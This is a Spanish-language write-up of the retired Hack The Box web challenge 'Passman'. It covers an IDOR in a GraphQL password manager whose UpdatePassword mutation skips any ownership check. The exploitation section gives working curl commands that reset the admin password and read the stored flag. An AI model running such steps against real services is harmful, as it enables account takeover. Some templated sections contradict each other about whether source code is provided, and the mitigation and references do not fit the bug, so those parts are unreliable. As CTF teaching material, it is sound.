---
challenge: Passman
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, graphql, idor, broken-access-control, source-review]
---


# Passman — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Gestor de contraseñas con **código fuente** y una API **GraphQL**. La mutación `UpdatePassword` no comprueba a quién pertenece la cuenta: **IDOR / control de acceso roto**. Cambiando la contraseña del usuario `admin` se entra en su cuenta, y ahí está la flag guardada como contraseña.

## Enunciado y superficie

«Pandora sospecha que hay un topo en el ministerio y necesita la contraseña maestra, que está en un gestor de contraseñas». Se entrega el código y hay un `entrypoint.sh` que siembra la base de datos.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

```bash
unzip passman.zip && cd passman
cat entrypoint.sh
grep -rn "GraphQL\|mutation\|UpdatePassword" --include=*.js .
```

En `entrypoint.sh` se ve el `INSERT` inicial: el usuario `admin` existe con una contraseña que es la propia flag, y hay una tabla `saved_passwords` con una entrada suya.

```javascript
// helpers/GraphqlHelper.js
UpdatePassword: {
  type: ResponseType,
  args: { username: { type: new GraphQLNonNull(GraphQLString) },
          password: { type: new GraphQLNonNull(GraphQLString) } },
  resolve: async (root, args, request) => {
    // no ownership check, no JWT verification for the target user
    return db.updatePassword(args.username, args.password);
  }
}
```

La mutación acepta cualquier `username` y no compara con la identidad del token: se puede cambiar la contraseña de otro.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

1. **Registro y login** para obtener un JWT válido:

```bash
curl -s -X POST http://<IP>:<puerto>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ RegisterUser(email:\"a@a.a\",username:\"x\",password:\"x\"){ message } }"}'
```

```bash
TOKEN=$(curl -s -X POST http://<IP>:<puerto>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ LoginUser(username:\"x\",password:\"x\"){ token } }"}' \
  | jq -r '.data.LoginUser.token')
```

2. **Cambiar la contraseña de `admin`** con la mutación vulnerable:

```bash
curl -s -X POST http://<IP>:<puerto>/graphql \
  -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation{ UpdatePassword(username:\"admin\",password:\"Pwned123!\"){ message } }"}'
```

3. **Entrar como admin** y leer sus contraseñas guardadas:

```bash
curl -s -X POST http://<IP>:<puerto>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation{ LoginUser(username:\"admin\",password:\"Pwned123!\"){ token } }"}'
```

Con el token de admin, la consulta de contraseñas guardadas devuelve la flag:

```graphql
{ getPhrase(username: "admin") { address username password } }
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Introspection**: si está deshabilitada, el código fuente da los nombres exactos de mutaciones y campos.
- **JWT**: el token de usuario normal sirve para llamar a la mutación; no hace falta forjarlo.
- **Formato**: GraphQL exige `Content-Type: application/json`; un `POST` de formulario devuelve error de sintaxis.
- **Contraseña nueva**: cumple cualquier política que aplique el registro, o el `update` falla en silencio.

- GraphQL no aporta autorización por sí solo: cada resolver debe comprobar el propietario del recurso.
- Un `username` en los argumentos es una invitación a IDOR; debe salir del token, no del cliente.
- La revisión de código encuentra esto en minutos; el escaneo automático, casi nunca.
- Mitigación: derivar el usuario del JWT, comprobar propiedad en cada mutación y limitar la introspection en producción.

## Mitigaciones y detección

- Fijar el algoritmo esperado y validar firma, `iss`, `aud` y caducidad en cada petición.

## Referencias

- [node-jwt-prototype](../../knowledge/web/node-jwt-prototype.md)
- [rop-stack](../../knowledge/pwn/rop-stack.md)
